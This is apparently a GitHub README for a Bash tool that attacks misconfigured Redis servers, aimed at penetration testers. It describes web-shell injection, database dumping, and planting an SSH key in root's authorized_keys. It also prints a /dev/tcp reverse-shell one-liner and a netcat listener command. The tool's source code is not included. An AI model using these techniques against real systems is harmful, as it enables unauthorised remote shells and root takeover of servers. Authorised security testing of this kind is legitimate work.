<a href="https://www.buymeacoffee.com/0xDTC"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a knowledge&emoji=📖&slug=0xDTC&button_colour=FF5F5F&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

# Redis Exploit Automation Script

This script is designed for penetration testers and ethical hackers to exploit Redis misconfigurations. It automates tasks such as injecting custom web shells, dumping the Redis database, and injecting SSH keys for privilege escalation.

---

## Features
1. **Redis Connectivity Check**:
   - Verifies if the target Redis server is reachable.
   - Supports authentication if required.

2. **Custom Web Shell Injection**:
   - Prompts the user to input a custom shell command (e.g., a reverse shell payload).
   - Injects the command into a writable directory on the target.

3. **Database Dump**:
   - Dumps the Redis database to disk for offline analysis.

4. **SSH Key Injection**:
   - Injects an SSH public key for root access if the target allows configuration changes.

5. **Netcat Listener Validation**:
   - Ensures a listener (`nc -lvnp <port>`) is running before executing commands requiring it.

---

## Requirements
- **Dependencies**:
  - `redis-cli`: To interact with the Redis server.
  - `curl`: To fetch reverse shell payloads if needed.
  - `netstat`: To check for active Netcat listeners.

Install dependencies on Debian/Ubuntu:
```bash
sudo apt update
sudo apt install redis-tools curl net-tools
```

---

## Usage
1. Clone this repository:
   ```bash
   git clone https://github.com/yourusername/redis-exploit-script.git
   cd redis-exploit-script
   ```

2. Make the script executable:
   ```bash
   chmod +x redis_exploit.sh
   ```

3. Run the script:
   ```bash
   ./redis_exploit.sh <host> <port> [password]
   ```
   - Replace `<host>` with the Redis server's IP.
   - Replace `<port>` with the Redis server's port (default: 6379).
   - If authentication is required, provide the `password`. Otherwise, omit it.

---

## Menu Options
1. **Inject a Custom Web Shell**:
   - Prompts the user to input a shell command.
   - Example: A reverse shell payload such as:
     ```bash
     bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1
     ```
   - Injects the payload into a writable web directory on the target.
   - Access the web shell via: `http://<host>/customshell.php`.

2. **Dump the Database**:
   - Executes `SAVE` to dump the database to disk.
   - Provides instructions to fetch the `dump.rdb` file for offline analysis.

3. **Inject an SSH Key**:
   - Prompts for your SSH public key.
   - Injects the key into `/root/.ssh/authorized_keys`.
   - Allows SSH access to the target as `root`.

---

## Examples
- **Run Script Without Authentication**:
  ```bash
  ./redis_exploit.sh 192.168.1.10 6379
  ```

- **Run Script with Authentication**:
  ```bash
  ./redis_exploit.sh 192.168.1.10 6379 mypassword
  ```

---

## Notes
- Ensure you have a Netcat listener running for reverse shells:
  ```bash
  nc -lvnp <your-port>
  ```

- The script will wait until the listener is active before proceeding with shell injection.

---

## Disclaimer
This script is intended for legal and ethical use only. Ensure you have explicit permission before testing or exploiting any Redis server. Misuse of this script may lead to legal consequences.

---

## Contribution
Feel free to open issues or submit pull requests to improve the script!
